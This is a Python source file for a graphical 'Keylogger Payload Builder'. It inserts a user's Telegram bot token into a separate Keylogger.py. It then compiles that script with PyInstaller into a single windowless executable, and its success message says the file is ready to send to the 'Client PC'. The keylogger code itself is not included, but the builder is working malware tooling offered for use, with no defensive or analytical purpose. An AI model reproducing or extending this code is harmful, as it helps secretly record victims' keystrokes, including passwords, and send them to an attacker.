import tkinter as tk
from tkinter import messagebox, filedialog
import os
import re
import sys
import subprocess
import threading
import shutil

# Paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SCRIPT_PATH = os.path.join(BASE_DIR, "Keylogger.py")
ICON_PATH = os.path.join(BASE_DIR, "icon.ico") # Optional if user has one

class BuilderGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Keylogger Builder 🛠️")
        self.root.geometry("450x300")
        self.root.resizable(False, False)
        
        # Title
        tk.Label(self.root, text="🕵️ Keylogger Payload Builder", font=("Segoe UI", 16, "bold")).pack(pady=15)
        
        # Token Input
        tk.Label(self.root, text="Enter Your Telegram Bot Token:", font=("Segoe UI", 10)).pack(anchor="w", padx=30)
        self.token_entry = tk.Entry(self.root, width=50, font=("Consolas", 9))
        self.token_entry.pack(pady=5, padx=30)
        
        # Build Button
        self.build_btn = tk.Button(self.root, text="🚀 Build .EXE Payload", command=self.start_build, 
                                   bg="#0078D7", fg="white", font=("Segoe UI", 12, "bold"), height=2, width=30)
        self.build_btn.pack(pady=20)
        
        # Status
        self.status_label = tk.Label(self.root, text="Ready to build.", fg="gray", font=("Segoe UI", 9))
        self.status_label.pack(side=tk.BOTTOM, pady=10)

        # Load existing token if possible
        self.load_existing_token()

    def load_existing_token(self):
        """Try to read the current token from Keylogger.py"""
        try:
            with open(SCRIPT_PATH, "r", encoding="utf-8") as f:
                content = f.read()
                # Regex to find BOT_TOKEN = "..."
                match = re.search(r'BOT_TOKEN\s*=\s*["\']([^"\']+)["\']', content)
                if match:
                    self.token_entry.insert(0, match.group(1))
        except Exception:
            pass

    def start_build(self):
        token = self.token_entry.get().strip()
        if not token:
            messagebox.showerror("Error", "Bot Token is required!")
            return
            
        # 1. Update Keylogger.py
        if not self.update_script(token):
            return
            
        # 2. Run PyInstaller in Thread
        self.build_btn.config(state=tk.DISABLED, text="Building... Please Wait ⏳")
        self.status_label.config(text="Compiling EXE... This may take a minute.", fg="blue")
        
        threading.Thread(target=self.run_pyinstaller, daemon=True).start()

    def update_script(self, token):
        try:
            with open(SCRIPT_PATH, "r", encoding="utf-8") as f:
                content = f.read()
            
            # Replace Token
            new_content = re.sub(r'BOT_TOKEN\s*=\s*["\']([^"\']+)["\']', f'BOT_TOKEN = "{token}"', content)
            
            with open(SCRIPT_PATH, "w", encoding="utf-8") as f:
                f.write(new_content)
                
            return True
        except Exception as e:
            messagebox.showerror("Error", f"Failed to update script: {e}")
            self.status_label.config(text="Error updating script.", fg="red")
            return False

    def run_pyinstaller(self):
        try:
            # Clean build folders
            if os.path.exists(os.path.join(BASE_DIR, "build")):
                shutil.rmtree(os.path.join(BASE_DIR, "build"))
            if os.path.exists(os.path.join(BASE_DIR, "dist")):
                shutil.rmtree(os.path.join(BASE_DIR, "dist"))
                
            # Command: pyinstaller --onefile --noconsole Keylogger.py
            cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", SCRIPT_PATH]
            
            process = subprocess.Popen(cmd, cwd=BASE_DIR, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            
            if process.returncode == 0:
                self.root.after(0, self.build_success)
            else:
                print(stderr) # Check terminal for errors
                self.root.after(0, self.build_failed)
                
        except Exception as e:
            print(f"Build Error: {e}")
            self.root.after(0, self.build_failed)

    def build_success(self):
        self.status_label.config(text="✅ Build Complete! Check 'dist' folder.", fg="green")
        self.build_btn.config(state=tk.NORMAL, text="🚀 Build .EXE Payload")
        messagebox.showinfo("Success", "Build Successful!\n\nThe .exe file is in the 'dist' folder.\nYou can now send it to the Client PC.")
        
        # Open dist folder
        dist_path = os.path.join(BASE_DIR, "dist")
        os.startfile(dist_path)

    def build_failed(self):
        self.status_label.config(text="❌ Build Failed. Check terminal.", fg="red")
        self.build_btn.config(state=tk.NORMAL, text="🚀 Build .EXE Payload")
        messagebox.showerror("Error", "Build Failed!\nCheck the terminal output for details.")

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = BuilderGUI()
    app.run()
